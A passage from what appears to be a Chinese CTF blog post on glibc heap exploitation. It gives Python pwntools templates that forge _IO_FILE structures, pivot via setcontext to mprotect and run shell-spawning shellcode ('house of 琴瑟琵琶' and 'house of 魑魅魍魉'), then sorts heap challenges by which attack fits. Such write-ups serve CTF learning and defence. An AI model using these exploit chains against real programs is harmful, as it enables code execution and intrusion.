REG_R12</span></span><br><span class="line">  REG_R13,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R13    REG_R13</span></span><br><span class="line">  REG_R14,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R14    REG_R14</span></span><br><span class="line">  REG_R15,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_R15    REG_R15</span></span><br><span class="line">  REG_RDI,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RDI    REG_RDI</span></span><br><span class="line">  REG_RSI,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RSI    REG_RSI</span></span><br><span class="line">  REG_RBP,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RBP    REG_RBP</span></span><br><span class="line">  REG_RBX,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RBX    REG_RBX</span></span><br><span class="line">  REG_RDX,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RDX    REG_RDX</span></span><br><span class="line">  REG_RAX,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RAX    REG_RAX</span></span><br><span class="line">  REG_RCX,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RCX    REG_RCX</span></span><br><span class="line">  REG_RSP,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RSP    REG_RSP</span></span><br><span class="line">  REG_RIP,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_RIP    REG_RIP</span></span><br><span class="line">  REG_EFL,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_EFL    REG_EFL</span></span><br><span class="line">  REG_CSGSFS,        <span class="comment">/* Actually short cs, gs, fs, __pad0.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_CSGSFS    REG_CSGSFS</span></span><br><span class="line">  REG_ERR,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_ERR    REG_ERR</span></span><br><span class="line">  REG_TRAPNO,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_TRAPNO    REG_TRAPNO</span></span><br><span class="line">  REG_OLDMASK,</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_OLDMASK    REG_OLDMASK</span></span><br><span class="line">  REG_CR2</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> REG_CR2    REG_CR2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<ol start="3" type="1">
<li><code>__fpregs_mem</code>：这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载浮点环境，需要可写。偏移为<code>0xe0</code></li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Restore the floating-point context.  Not the registers, only the</span></span><br><span class="line"><span class="comment">       rest.  */</span></span><br><span class="line">    movq    <span class="title function_">oFPREGS</span><span class="params">(%rdx)</span>, %rcx</span><br><span class="line">    <span class="title function_">fldenv</span>    <span class="params">(%rcx)</span></span><br></pre></td></tr></table></figure></div>
<ol start="4" type="1">
<li><code>__ssp</code>：这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载 MXCSR 寄存器，经测试0也行，偏移为<code>0x1c0</code></li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldmxcsr <span class="title function_">oMXCSR</span><span class="params">(%rdx)</span></span><br></pre></td></tr></table></figure></div>
<h4 id="exp">exp</h4>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">ucontext =<span class="string">b&#x27;&#x27;</span></span><br><span class="line">ucontext += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">mprotect_len = <span class="number">0x20000</span></span><br><span class="line">__rdi = heap_addr <span class="comment"># heap_addr binsh_addr</span></span><br><span class="line">__rsi = mprotect_len     </span><br><span class="line">__rbp = heap_addr + mprotect_len</span><br><span class="line">__rbx = <span class="number">0</span></span><br><span class="line">__rdx = <span class="number">7</span></span><br><span class="line">__rcx = <span class="number">0</span></span><br><span class="line">__rax = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 当下面 padding 为空时，fake_io_addr 就是 ucontext 开始的地址</span></span><br><span class="line">padding = fake_io_file</span><br><span class="line">payload_start_addr = fake_io_addr</span><br><span class="line"><span class="comment"># 0x2e8 下面的  print(&quot;IO_FILE len is&quot;,hex(len(payload)))</span></span><br><span class="line"><span class="comment"># largbin_attak 时需要 + 0x10</span></span><br><span class="line">__rsp = payload_start_addr + <span class="number">0x2e8</span> + <span class="number">0x10</span></span><br><span class="line">__rip = mprotect_addr</span><br><span class="line">ucontext += p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">ucontext += p64(__rdi)</span><br><span class="line">ucontext += p64(__rsi)</span><br><span class="line">ucontext += p64(__rbp)</span><br><span class="line">ucontext += p64(__rbx)</span><br><span class="line">ucontext += p64(__rdx)</span><br><span class="line">ucontext += p64(__rcx)</span><br><span class="line">ucontext += p64(__rax)</span><br><span class="line">ucontext += p64(__rsp)</span><br><span class="line">ucontext += p64(__rip)</span><br><span class="line">ucontext = ucontext.ljust(<span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">ucontext += p64(heap_addr+<span class="number">0x6000</span>)   <span class="comment"># fldenv [rcx]  加载浮点环境，需要可写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ucontext len is:&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(ucontext)))  <span class="comment"># 0xe8</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ucontext = ucontext.ljust(0x128,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"># 加载信号量 ，好像全是0也行 ,0x10个字长</span></span><br><span class="line"><span class="string">ucontext += p64(0)*0x10</span></span><br><span class="line"><span class="string"># ucontext += p64(0)+p64(0x0000002000000000)+p64(0)+p64(0)+p64(0x0000034000000340)+p64(0x0000000000000001)+p64(0x0000000103ae75f6)+p64(0)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0x0000034000000340)+p64(0)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">ucontext =ucontext.ljust(0x1c0,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"># ucontext += p64(0x1f80)    # LDMXCSR [rdx+0x1c0] 加载 MXCSR 寄存器，好像是0也行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload 可以开始于 fake_io_file ，也可以直接从 ucontext 开始</span></span><br><span class="line">payload = padding + ucontext</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 0x2e8 与 __rsp相呼应</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IO_FILE len is&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload))) </span><br><span class="line"><span class="comment"># 自己写 shellcode</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># largbin_attak 时需要 + 0x10</span></span><br><span class="line">payload += p64(fake_io_addr + <span class="built_in">len</span>(payload) + <span class="number">0x8</span> + <span class="number">0x10</span>)  </span><br><span class="line"> </span><br><span class="line">payload += <span class="built_in">bytes</span>(asm(shellcode))</span><br></pre></td></tr></table></figure></div>
<h3 id="完全体">完全体</h3>
<h4 id="house-of-琴瑟琵琶">house of 琴瑟琵琶</h4>
<h5 id="exp-1">exp</h5>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">obstack_ptr = fake_io_addr + <span class="number">0x30</span></span><br><span class="line">fake_io_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(setcontext_addr)  <span class="comment"># 需要执行的函数</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(fake_io_addr+<span class="number">0xe8</span>)  <span class="comment"># 执行函数的 rdi</span></span><br><span class="line">fake_io_file += p64(<span class="number">1</span>)  <span class="comment"># obstack-&gt;use_extra_arg=1</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>)  <span class="comment"># _IO_lock_t *_lock;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_obstack_jumps_addr + <span class="number">0x20</span>)  <span class="comment"># 触发 _IO_obstack_xsputn;</span></span><br><span class="line">fake_io_file += p64(obstack_ptr)  <span class="comment"># struct obstack *obstack</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_io_file))) <span class="comment"># 因为是largebin attack 所以: 0xd8=0xe8-0x10</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 执行函数的 rdi 的地址所存储的内容</span></span><br><span class="line">ucontext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ucontext += p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">mprotect_len = <span class="number">0x20000</span></span><br><span class="line">tcache_thead_size = <span class="number">0x290</span></span><br><span class="line">__rdi = heap_addr <span class="comment"># heap_addr binsh_addr</span></span><br><span class="line">__rsi = mprotect_len     </span><br><span class="line">__rbp = heap_addr + mprotect_len</span><br><span class="line">__rbx = <span class="number">0</span></span><br><span class="line">__rdx = <span class="number">7</span></span><br><span class="line">__rcx = <span class="number">0</span></span><br><span class="line">__rax = <span class="number">0</span></span><br><span class="line"><span class="comment"># heap_addr + tcache_thead_size + 0x10000  # systm 栈帧务必要足够长</span></span><br><span class="line"><span class="comment"># 0x1c8 对应第256行的  print(&quot;payload len is&quot;,hex(len(payload)))</span></span><br><span class="line"><span class="comment"># largbin_attak 时需要 + 0x10</span></span><br><span class="line">__rsp = fake_io_addr + <span class="number">0x1c0</span>  + <span class="number">0x10</span></span><br><span class="line">__rip = mprotect_addr <span class="comment">#execve_addr #mprotect_addr</span></span><br><span class="line">ucontext += p64(__rdi)</span><br><span class="line">ucontext += p64(__rsi)</span><br><span class="line">ucontext += p64(__rbp)</span><br><span class="line">ucontext += p64(__rbx)</span><br><span class="line">ucontext += p64(__rdx)</span><br><span class="line">ucontext += p64(__rcx)</span><br><span class="line">ucontext += p64(__rax)</span><br><span class="line">ucontext += p64(__rsp)</span><br><span class="line">ucontext += p64(__rip)</span><br><span class="line">ucontext = ucontext.ljust(<span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">ucontext += p64(heap_addr+<span class="number">0x6000</span>)   <span class="comment"># fldenv [rcx]  加载浮点环境，需要可写</span></span><br><span class="line"> </span><br><span class="line">payload = fake_io_file + ucontext  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload len is&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))  <span class="comment"># 0x1c0 与__rsp相呼应</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload += p64(fake_io_addr + <span class="built_in">len</span>(payload) + <span class="number">0x8</span> + <span class="number">0x10</span>)  <span class="comment"># largbin_attak 时需要 +0x10</span></span><br><span class="line">payload = payload + <span class="built_in">bytes</span>(shellcode)</span><br></pre></td></tr></table></figure></div>
<h4 id="house-of-魑魅魍魉">house of 魑魅魍魉</h4>
<h5 id="exp-2">exp</h5>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># largebin_attack 攻击 house_魑魅魍魉</span></span><br><span class="line"><span class="comment"># 模拟只有一次写入，payload 必须在前面写入</span></span><br><span class="line"><span class="comment"># 为确保正确执行，需要利用 COMPILE_WPRINTF==1 的模式</span></span><br><span class="line"> </span><br><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">put_stream_offset = <span class="number">0x30</span>  <span class="comment"># put_stream 距离 fake_io 的偏移</span></span><br><span class="line">put_stream_addr = fake_io_addr + put_stream_offset</span><br><span class="line">write_target_addr = memcpy_addr</span><br><span class="line">target_value_offset = <span class="number">0x200</span>  <span class="comment"># 需要执行的函数存储的地址距离 fake_io 的偏移</span></span><br><span class="line">target_value_addr = fake_io_addr  + target_value_offset</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IO_wide_data_addr = fake_io_addr + <span class="number">0xe0</span> <span class="comment"># len(IO_IFLE) 利用原有的宽字符</span></span><br><span class="line"><span class="comment"># 再一次执行到 memcpy时rdi的地址</span></span><br><span class="line">rdi_offset = <span class="number">0xf</span>  <span class="comment"># 因为 _IO_write_ptr 会加1，此处确保内存对齐</span></span><br><span class="line">rdi_ucontext_addr = target_value_addr + rdi_offset</span><br><span class="line"><span class="comment"># more_len &gt; count_len &gt; 0x20 可以再次执行 memcpy</span></span><br><span class="line">more_len = <span class="number">0x80</span>*<span class="number">8</span>   <span class="comment"># 为什么 IO_help_jump_0_ 里面还要在右边移位2位？？</span></span><br><span class="line">count_len= <span class="number">0x28</span> <span class="comment"># 要大于0x20</span></span><br><span class="line">_flags = <span class="number">0x400</span> <span class="comment">#_flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">fake_io_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(_flags) <span class="comment"># 此处是 put_stream 起始地址; _flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line">fake_io_file += p64(rdi_ucontext_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(write_target_addr - <span class="number">0x20</span>)</span><br><span class="line">fake_io_file += p64(write_target_addr)</span><br><span class="line">fake_io_file += p64(write_target_addr + count_len)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 用于绕过  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) 不执行malloc</span></span><br><span class="line">fake_io_file += p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>)-<span class="number">1</span>)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(IO_wide_data_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_help_jump_0_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(target_value_addr)</span><br><span class="line">fake_io_file += p64(target_value_addr + more_len)</span><br><span class="line">fake_io_file += p64(IO_str_jumps_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x1b8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(put_stream_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(target_value_offset - <span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># largbin_attak 时需要 - 0x10</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 需要执行的函数是 setcontext，距离 fake_io 的偏移为 target_value_offset</span></span><br><span class="line">fake_io_file += p64(setcontext_addr) + p64(<span class="number">0</span>)   <span class="comment"># 此段长度为 0x10 与 rdi_offset 对应</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ucontext =<span class="string">b&quot;&quot;</span></span><br><span class="line">ucontext += p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">mprotect_len = <span class="number">0x20000</span></span><br><span class="line">tcache_thead_size = <span class="number">0x290</span></span><br><span class="line">__rdi = heap_addr <span class="comment"># heap_addr binsh_addr</span></span><br><span class="line">__rsi = mprotect_len </span><br><span class="line">__rbp = heap_addr + mprotect_len</span><br><span class="line">__rbx = <span class="number">0</span></span><br><span class="line">__rdx = <span class="number">7</span></span><br><span class="line">__rcx = <span class="number">0</span></span><br><span class="line">__rax = <span class="number">0</span></span><br><span class="line"><span class="comment"># heap_addr + tcache_thead_size + 0x10000  # systm 栈帧务必要足够长</span></span><br><span class="line"><span class="comment"># 0x2e8 下面的  print(&quot;payload len is&quot;,hex(len(payload)))</span></span><br><span class="line"><span class="comment"># largbin_attak 时需要 + 0x10</span></span><br><span class="line">__rsp = fake_io_addr + <span class="number">0x2e8</span> + <span class="number">0x10</span></span><br><span class="line">__rip = mprotect_addr <span class="comment">#execve_addr #mprotect_addr</span></span><br><span class="line">ucontext += p64(__rdi)</span><br><span class="line">ucontext += p64(__rsi)</span><br><span class="line">ucontext += p64(__rbp)</span><br><span class="line">ucontext += p64(__rbx)</span><br><span class="line">ucontext += p64(__rdx)</span><br><span class="line">ucontext += p64(__rcx)</span><br><span class="line">ucontext += p64(__rax)</span><br><span class="line">ucontext += p64(__rsp)</span><br><span class="line">ucontext += p64(__rip)</span><br><span class="line">ucontext = ucontext.ljust(<span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>)  </span><br><span class="line">ucontext += p64(heap_addr+<span class="number">0x6000</span>)   <span class="comment"># fldenv [rcx]  加载浮点环境，需要可写</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload = fake_io_file + ucontext  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload len is&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))  <span class="comment"># 0x2e8 与__rsp相呼应</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload += p64(fake_io_addr + <span class="built_in">len</span>(payload) + <span class="number">0x8</span> + <span class="number">0x10</span>)  <span class="comment"># largbin_attak 时需要 + 0x10 </span></span><br><span class="line">payload += <span class="built_in">bytes</span>(shellcode)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>将堆的问题转化为几类： 1. 首先是内存修改的次数，有些题目可以多次（2次及以上）修改内存，有些只能一次 2. 修改内存的情况，有些可以任意写，既可以申请到此块内存；有些不能任意写入，只能写入堆值或者<code>unsortbin</code>地址，例如<code>largebin attack</code> 3. 泄露的情况，除了个别方法外，大都需要泄露内存，有些题目还能够再次泄露内存中的数据，例如泄露<code>ptr_guard</code>，我称为<strong>二次泄露</strong>。除了个别情况外，大部分题目要想实现“二次泄露”必须要能申请到所要泄露的位置，显然，如果不能对内存有任意写的能力，是不可能实现“二次泄露”的（设置flag的沙雕题目除外）</p>
<h4 id="修改内存地址不限次数不限数据不限可二次泄露">1.修改内存：地址不限、次数不限、数据不限；可二次泄露</h4>
<p>这种题目最为简单，2.34之前打hook，2.34及之后打EOP或者<code>wide_IO</code>都可以，如果有IO函数，还可以攻击<code>house of 秦月汉关</code>，基本上都是以<code>tcache</code>为主。</p>
<h4 id="修改内存地址不限次数不限数据不限不可二次泄露">2.修改内存：地址不限、次数不限、数据不限；不可二次泄露</h4>
<p>这种题目基本和上面的情况一样，只是在不能二次泄露的情况下，我们可以直接强制改写。</p>
<h4 id="修改内存地址不限一次数据不限可二次泄露">3.修改内存：地址不限、一次、数据不限；可二次泄露</h4>
<p>2.34之前打hook，2.34及之后打EOP或者<code>wide_IO</code>都可以。因为可以二次泄露，所以EOP也可以用。</p>
<h4 id="修改内存地址不限一次数据不限不可二次泄露">4.修改内存：地址不限、一次、数据不限；不可二次泄露</h4>
<p>2.34之前打hook，2.34及之后打<code>vtable</code>，<code>EOP</code>，<code>wide_IO</code>都可以。</p>
<p><strong>说明</strong>：从这里开始是个转折，一般如果可以任意改写内存都是可以申请到这一块内存，在这种情况下，改写<code>hook</code>是非常直管且简单的，即使2.34之后没有了<code>hook</code>，也可以通过修改<code>vtable</code>，<code>EOP</code>等手段来进行攻击。而如果无法任意改写内存则只能够通过IO来进行攻击。</p>
<h4 id="修改内存地址不限次数不限修改为堆可二次泄露不可能">5.修改内存：地址不限、次数不限、修改为堆；可二次泄露（不可能）</h4>
<p>如果不能任意改写内存，说明无法申请到这个内存，二次泄露基本不太可能。</p>
<h4 id="修改内存地址不限次数不限修改为堆不可二次泄露">6.修改内存：地址不限、次数不限、修改为堆；不可二次泄露</h4>
<p>能多次修改内存为堆值攻击选择很多，<code>house_of_emma</code>就是一种选择，当然宽字符的板子也没问题。</p>
<h4 id="修改内存地址不限一次修改为堆可二次泄露不可能">7.修改内存：地址不限、一次、修改为堆；可二次泄露（不可能）</h4>
<p>同5.</p>
<h4 id="修改内存地址不限一次修改为堆不可二次泄露">8.修改内存：地址不限、一次、修改为堆；不可二次泄露</h4>
<p>这种显然必须伪造IO，使用现有的<code>apple、cat、魑魅魍魉、琴瑟琵琶</code>等链进行攻击。</p>

	</div>

	<div class="page-template-comments">
		
	</div>
</div>

<div class="paginator">
	
</div>
  
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2025</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">LightCloveyou</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 4 篇文章
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">访问人数</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">总访问量</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
            
                
        
                
        
        
    </div>  
</footer>
		</div>
	</div>

	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
